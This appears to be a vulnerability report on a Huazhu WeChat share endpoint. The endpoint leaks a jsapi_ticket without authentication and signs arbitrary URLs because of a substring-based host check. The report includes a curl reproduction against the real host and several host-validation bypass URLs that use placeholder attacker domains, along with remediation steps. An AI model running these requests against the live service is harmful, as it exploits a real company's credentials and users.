# F002: newactivity 微信分享接口未授权泄露 JSAPI Ticket 且可为非白名单真实主机签名

- Severity: High
- Status: Confirmed
- Affected asset: `https://newactivity.huazhu.com/wechat/share`
- Preconditions: 无需登录；公网可直接请求。

## Summary

`newactivity.huazhu.com/wechat/share` 在未授权情况下返回微信公众号 `appId=wx9a40654fe6ac86f8` 的原始 `jsapi_ticket`，同时返回 `signature/timestamp/noncestr/jsApiList`。接口响应形态为 `callback({...})`，但本报告不依赖浏览器 JSONP 执行；漏洞核心是任何人可直接通过公网 GET 请求获取服务端敏感 ticket，并让服务端为攻击者构造的 URL 生成微信 JSSDK 签名。

进一步验证发现，`url` 参数的校验同样可被字符串包含绕过：只要 URL 字符串中出现 `campaign.huazhu.com`，即使真实主机是 `evil.invalid` 或 `campaign.huazhu.com.evil.invalid`，接口仍返回 `jsapi_ticket` 并为该 URL 生成有效 signature。

## Impact

- 原始 `jsapi_ticket` 属于服务端凭据，泄露后可被外部人员作为微信 JSSDK 签名 oracle 使用。
- `jsApiList` 包含 `getLocation`、`scanQRCode`、`chooseWXPay`、`uploadImage`、`uploadVoice`、`addCard/openCard` 等敏感能力。
- 如果攻击者再结合华住微信安全域名下的可控页面、XSS、开放跳转或前端链路缺陷，可能在华住公众号上下文中调用微信 JS-SDK 能力。
- 即使微信客户端仍有安全域名限制，当前服务端也不应把 `jsapi_ticket` 下发给任意未授权请求方。

Key raw response properties:

```http
GET /wechat/share?url=https%3A%2F%2Fcampaign.huazhu.com.evil.invalid%2Fpath HTTP/1.1
Host: newactivity.huazhu.com
Origin: https://attacker.invalid

HTTP/1.1 200
Content-Type: text/plain;charset=utf-8
X-Content-Type-Options: nosniff
```

Response body contains these fields（ticket 已在报告中脱敏；完整原始证据保存在本地 evidence 文件）:

```js
callback({
  "code": "200",
  "data": {
    "appId": "wx9a40654fe6ac86f8",
    "jsApiList": ["getLocation", "scanQRCode", "chooseWXPay", "uploadImage", "..."],
    "jsapi_ticket": "bxLdikRXVbTPdHSM...REDACTED...",
    "noncestr": "...",
    "signature": "ab325409b047c928708ccc6c9684d108fc2c7ffe",
    "timestamp": "1783591715",
    "url": "https://campaign.huazhu.com.evil.invalid/path"
  },
  "success": true
})
```

The returned signatures were independently recomputed and matched:

```text
sha1("jsapi_ticket=<returned_ticket>&noncestr=<returned_noncestr>&timestamp=<returned_timestamp>&url=<returned_url>")
= returned signature
```

Confirmed URL-validation bypass cases, all returned `jsapi_ticket` and valid matching signature:

```text
https://campaign.huazhu.com.evil.invalid/path
https://evil.invalid/path?next=https://campaign.huazhu.com/mgm-h5/
https://evil.invalid@campaign.huazhu.com/path
https://campaign.huazhu.com%2eevil.invalid/path
```

## Reproduction

```bash
curl -i 'https://newactivity.huazhu.com/wechat/share?url=https%3A%2F%2Fcampaign.huazhu.com.evil.invalid%2Fpath' \
  -H 'Origin: https://attacker.invalid'
```

Expected vulnerable result:

- HTTP 200.
- Body starts with `callback({`.
- Body includes `data.jsapi_ticket`.
- Body includes `data.url` equal to attacker-controlled `https://campaign.huazhu.com.evil.invalid/path`.
- Recomputed SHA1 signature equals returned `data.signature`.

## Root Cause

- 服务端将微信 `jsapi_ticket` 原始凭据返回给客户端。
- 签名接口对 `url` 参数没有进行严格的 URL 解析和主机名白名单校验，疑似使用字符串包含匹配。
- 接口不要求认证或任何调用方约束。

## Remediation

- 不要向客户端返回 `jsapi_ticket`；服务端应只返回必要的 `appId/timestamp/noncestr/signature`。
- 对 `url` 做规范化解析，仅允许精确匹配的可信 `scheme + hostname + port`。
- 拒绝 userinfo、编码点号、查询串夹带白名单域名、子串匹配等绕过样例。
- 将 `jsApiList` 缩小到最小必要能力。
- 如果该接口已不再使用，建议下线；如果必须保留，增加调用方鉴权、速率限制和审计。

## Verification after fix

- 响应体不再包含 `jsapi_ticket`。
- `https://campaign.huazhu.com.evil.invalid/path` 与 `https://evil.invalid/path?next=https://campaign.huazhu.com/...` 必须被拒绝。
- 对合法 URL 只返回签名结果，不返回底层 ticket。
